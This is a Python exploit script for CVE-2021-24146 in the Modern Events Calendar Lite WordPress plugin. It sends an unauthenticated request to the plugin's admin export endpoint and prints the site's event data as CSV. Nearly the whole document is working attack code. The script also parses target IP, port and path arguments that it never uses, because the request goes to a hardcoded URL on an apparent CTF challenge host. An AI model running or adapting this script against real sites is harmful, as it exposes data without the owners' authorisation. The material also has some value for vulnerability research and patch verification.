# Exploit Title: Wordpress Plugin Modern Events Calendar 5.16.2 - Event export (Unauthenticated)
# Date 01.07.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://webnus.net/modern-events-calendar/
# Software Link: https://downloads.wordpress.org/plugin/modern-events-calendar-lite.5.16.2.zip
# Version: Before 5.16.5
# Tested on: Ubuntu 18.04
# CVE: CVE-2021-24146
# CWE: CWE-863, CWE-284
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24146/README.md

'''
Description:
Lack of authorisation checks in the Modern Events Calendar Lite WordPress plugin,
versions before 5.16.5, did not properly restrict access to the export files,
allowing unauthenticated users to exports all events data in CSV or XML format for example.
'''


'''
Banner:
'''
banner = """
   _______    ________    ___   ____ ___  ___     ___  __ __ _____ __  _____
  / ____/ |  / / ____/   |__ \ / __ \__ \<  /    |__ \/ // /<  / // / / ___/
 / /    | | / / __/________/ // / / /_/ // /_______/ / // /_/ / // /_/ __ \ 
/ /___  | |/ / /__/_____/ __// /_/ / __// /_____/ __/__  __/ /__  __/ /_/ / 
\____/  |___/_____/    /____/\____/____/_/     /____/ /_/ /_/  /_/  \____/  
                                                                                                                                                                                                                                                                                                          
            * WordPress Plugin Modern Events Calendar Lite < 5.16.2 - Export Event Data (Unauthenticated)
            * @Hacker5preme                                                                                                                            
                            
"""
print(banner)


'''
Import required modules:
'''
import requests
import argparse
import csv

'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='Wordpress Plugin Modern Events CalendarExport Event Data (Unauthenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH


'''
Exploit:
'''
print('')
print('[+] Exported Data: ')
print('')
exploit_url = 'http://01.linux.challenges.ctf.thefewchosen.com:57635/wp-admin/admin.php?page=MEC-ix&tab=MEC-export&mec-ix-action=export-events&format=csv'
answer = requests.get(exploit_url)
decoded_content = answer.content.decode('utf-8')
cr = csv.reader(decoded_content.splitlines(), delimiter=',')
my_list = list(cr)
for row in my_list:
    print(row)